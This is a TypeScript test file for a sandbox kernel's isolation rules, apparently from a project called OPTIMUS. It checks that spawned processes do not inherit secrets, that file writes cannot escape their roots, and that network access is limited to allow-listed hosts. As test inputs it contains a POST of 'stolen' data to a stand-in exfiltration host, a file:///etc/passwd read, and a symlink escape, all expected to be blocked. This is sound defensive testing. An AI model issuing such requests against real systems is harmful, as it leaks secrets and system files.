import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, rm, mkdir, writeFile, symlink, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createContext } from "../../kernel/permissions";
import { MemoryArtifactStore } from "../../kernel/artifacts";
import { Broker, BrokerError } from "../../kernel/broker";
import { SandboxViolation, type Isolation } from "../../kernel/sandbox";
import type { Capability } from "../../kernel/types";

/**
 * K4 · gate 10 — isolation invariants. Every test here fails if the boundary
 * is removed; none of them assert that a declaration merely EXISTS.
 *
 * The environment cases matter most: before K4, spawnProcess merged all of
 * process.env into every child, so a spawned engine received every provider
 * key in .env plus OPTIMUS_SESSION_SECRET. ProcessSpec's docstring claimed a
 * "minimal safe base" the code never implemented.
 */

const SECRET = "sk-do-not-leak-this-to-a-child-process";

function ctx(granted: readonly string[], isolation: Isolation) {
  return createContext({
    capabilityId: "test.capability",
    granted: granted as never,
    store: new MemoryArtifactStore(),
    isolation,
  });
}

function cap(id: string, permissions: string[], isolation?: Isolation): Capability {
  return {
    manifest: {
      id,
      version: "1.0.0",
      permissions: permissions as never,
      isolation,
      inputConstraints: {}, // takes no input; {} means "must be empty", not "anything goes"
      outputs: {}, // and returns none either
      defaultBudget: { maxAttempts: 1, maxWallTimeMs: 1000, maxCost: 1 },
      description: "fixture",
    },
    async run() {
      return {};
    },
  };
}

describe("K4 · a child process cannot read secrets it was never granted", () => {
  beforeEach(() => {
    process.env.OPTIMUS_TEST_SECRET = SECRET;
  });
  afterEach(() => {
    delete process.env.OPTIMUS_TEST_SECRET;
  });

  /** The regression that closes a real leak, not a hypothetical one. */
  it("strips an un-allow-listed secret out of the child's environment entirely", async () => {
    const result = await ctx(["proc:spawn"], { cwd: tmpdir() }).spawnProcess({
      command: process.execPath,
      args: ["-e", "process.stdout.write(String(process.env.OPTIMUS_TEST_SECRET))"],
      timeoutMs: 10_000,
    });

    expect(result.stdout).toBe("undefined");
    expect(result.stdout).not.toContain(SECRET);
  });

  it("passes through a variable the capability explicitly allow-listed", async () => {
    const result = await ctx(["proc:spawn"], {
      cwd: tmpdir(),
      env: ["OPTIMUS_TEST_SECRET"],
    }).spawnProcess({
      command: process.execPath,
      args: ["-e", "process.stdout.write(String(process.env.OPTIMUS_TEST_SECRET))"],
      timeoutMs: 10_000,
    });

    expect(result.stdout).toBe(SECRET);
  });

  it("still gives the child a working PATH, or nothing could ever be spawned", async () => {
    const result = await ctx(["proc:spawn"], { cwd: tmpdir() }).spawnProcess({
      command: process.execPath,
      args: ["-e", "process.stdout.write(process.env.PATH ? 'has-path' : 'no-path')"],
      timeoutMs: 10_000,
    });

    expect(result.stdout).toBe("has-path");
  });

  it("pins the child to its declared cwd, not wherever OPTIMUS was started", async () => {
    const dir = await mkdtemp(join(tmpdir(), "optimus-cwd-"));
    try {
      const result = await ctx(["proc:spawn"], { cwd: dir }).spawnProcess({
        command: process.execPath,
        args: ["-e", "process.stdout.write(process.cwd())"],
        timeoutMs: 10_000,
      });
      // macOS reports /private/var for /var, so compare resolved tails.
      expect(result.stdout).toContain(dir.replace(/^\/private/, ""));
      expect(result.stdout).not.toBe(process.cwd());
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("refuses to spawn at all when no cwd is declared", async () => {
    await expect(
      ctx(["proc:spawn"], {}).spawnProcess({
        command: process.execPath,
        args: ["-e", ""],
        timeoutMs: 10_000,
      }),
    ).rejects.toThrow(SandboxViolation);
  });
});

describe("K4 · filesystem containment", () => {
  let root: string;
  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "optimus-sandbox-"));
  });
  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  it("allows a write inside a declared writeRoot", async () => {
    const target = join(root, "nested", "out.txt");
    await ctx(["fs:write"], { writeRoots: [root] }).fsWrite(target, "hello");
    expect(await readFile(target, "utf8")).toBe("hello");
  });

  it("refuses a write that climbs out with ..", async () => {
    await expect(
      ctx(["fs:write"], { writeRoots: [root] }).fsWrite(join(root, "..", "..", "escaped.txt"), "x"),
    ).rejects.toThrow(SandboxViolation);
  });

  /** A naive string-prefix check passes this. Resolving symlinks first is what stops it. */
  it("refuses a write through a symlink that points outside the root", async () => {
    const outside = await mkdtemp(join(tmpdir(), "optimus-outside-"));
    try {
      await symlink(outside, join(root, "escape-hatch"));
      await expect(
        ctx(["fs:write"], { writeRoots: [root] }).fsWrite(join(root, "escape-hatch", "owned.txt"), "x"),
      ).rejects.toThrow(/may only write beneath/);
    } finally {
      await rm(outside, { recursive: true, force: true });
    }
  });

  it("refuses a read outside the declared readRoots", async () => {
    const outside = await mkdtemp(join(tmpdir(), "optimus-outside-"));
    try {
      await writeFile(join(outside, "secret.txt"), "classified");
      await expect(
        ctx(["fs:read"], { readRoots: [root] }).fsRead(join(outside, "secret.txt")),
      ).rejects.toThrow(SandboxViolation);
    } finally {
      await rm(outside, { recursive: true, force: true });
    }
  });

  it("grants nothing when the permission is held but no root is declared", async () => {
    // The whole point of K4: a permission is necessary, never sufficient.
    await mkdir(join(root, "d"), { recursive: true });
    await expect(ctx(["fs:write"], {}).fsWrite(join(root, "d", "f.txt"), "x")).rejects.toThrow(
      /declares no writeRoots/,
    );
  });
});

describe("K4 · network host allow-list", () => {
  it("lets a declared host through — what fails after that is the network, not the boundary", async () => {
    let error: unknown;
    try {
      await ctx(["net:read"], { allowedHosts: ["127.0.0.1"] }).netFetch({
        url: "http://127.0.0.1:1/never-connects",
        timeoutMs: 200,
      });
    } catch (caught) {
      error = caught;
    }
    // Nothing listens on port 1, so this connection fails — the point is that
    // it fails as a NETWORK error (or times out), never as a denial. Asserting
    // "no error" would test nothing; asserting the KIND is the real invariant.
    expect(error).not.toBeInstanceOf(SandboxViolation);
  });

  it("refuses a host that was not declared", async () => {
    await expect(
      ctx(["net:write"], { allowedHosts: ["127.0.0.1"] }).netFetch({
        url: "https://exfiltrate.example.com/collect",
        method: "POST",
        body: "stolen",
        timeoutMs: 50,
      }),
    ).rejects.toThrow(/may only reach 127\.0\.0\.1/);
  });

  it("refuses file:// outright — it would route around the filesystem boundary", async () => {
    await expect(
      ctx(["net:read"], { allowedHosts: ["127.0.0.1"] }).netFetch({
        url: "file:///etc/passwd",
        timeoutMs: 50,
      }),
    ).rejects.toThrow(/may not use the file: scheme/);
  });

  it("reaches nothing when no hosts are declared", async () => {
    await expect(
      ctx(["net:read"], {}).netFetch({ url: "http://127.0.0.1/", timeoutMs: 50 }),
    ).rejects.toThrow(/declares no allowedHosts/);
  });

  /**
   * netRead's host check had NO test until now. The gap surfaced from an
   * asymmetry in the mutation table — removing the check from netFetch broke
   * 4 assertions, so the same guard on netRead was worth probing. Removing it
   * there broke nothing at all: 143 passed. These two close that.
   */
  it("refuses an undeclared host on netRead, not just netFetch", async () => {
    let fetcherCalled = false;
    const context = createContext({
      capabilityId: "test.capability",
      granted: ["net:read"],
      store: new MemoryArtifactStore(),
      isolation: { allowedHosts: ["allowed.test"] },
      fetcher: async () => {
        fetcherCalled = true;
        return "body";
      },
    });

    await expect(context.netRead("https://exfiltrate.example.com/collect")).rejects.toThrow(
      SandboxViolation,
    );
    // The boundary must deny BEFORE the side effect, not clean up after it.
    expect(fetcherCalled).toBe(false);
  });

  it("lets netRead through to its fetcher for a declared host", async () => {
    const context = createContext({
      capabilityId: "test.capability",
      granted: ["net:read"],
      store: new MemoryArtifactStore(),
      isolation: { allowedHosts: ["allowed.test"] },
      fetcher: async () => "real body",
    });

    expect(await context.netRead("https://allowed.test/page")).toBe("real body");
  });

  it("does not treat a suffix as a match — no implicit wildcards", async () => {
    await expect(
      ctx(["net:read"], { allowedHosts: ["example.com"] }).netFetch({
        url: "http://evil-example.com/",
        timeoutMs: 50,
      }),
    ).rejects.toThrow(SandboxViolation);
  });
});

describe("K4 · the broker refuses an unbounded radius at registration", () => {
  it("refuses fs:write with no writeRoots", () => {
    expect(() => new Broker().register(cap("a", ["fs:write"]))).toThrow(/unbounded radius/);
  });

  it("refuses fs:read with no readRoots", () => {
    expect(() => new Broker().register(cap("b", ["fs:read"]))).toThrow(/unbounded radius/);
  });

  it("refuses proc:spawn with no cwd", () => {
    expect(() => new Broker().register(cap("c", ["proc:spawn"]))).toThrow(/no isolation.cwd/);
  });

  it("refuses a net permission with no allowedHosts", () => {
    expect(() => new Broker().register(cap("d", ["net:read"]))).toThrow(BrokerError);
  });

  /**
   * The loophole an earlier draft of this file actually shipped: a capability
   * calling netFetch in-process claimed unconfinedChildEgress and the broker
   * waved it through, even though nothing about it involved a child process.
   */
  it("refuses unconfinedChildEgress as an excuse when nothing is being spawned", () => {
    expect(() =>
      new Broker().register(cap("e", ["net:write"], { unconfinedChildEgress: true })),
    ).toThrow(/must name their hosts/);
  });

  it("accepts unconfinedChildEgress only alongside proc:spawn", () => {
    expect(() =>
      new Broker().register(
        cap("f", ["net:read", "proc:spawn"], { cwd: tmpdir(), unconfinedChildEgress: true }),
      ),
    ).not.toThrow();
  });

  it("accepts a fully bounded manifest", () => {
    expect(() =>
      new Broker().register(
        cap("g", ["fs:read", "fs:write", "net:write"], {
          readRoots: [tmpdir()],
          writeRoots: [tmpdir()],
          allowedHosts: ["127.0.0.1"],
        }),
      ),
    ).not.toThrow();
  });
});
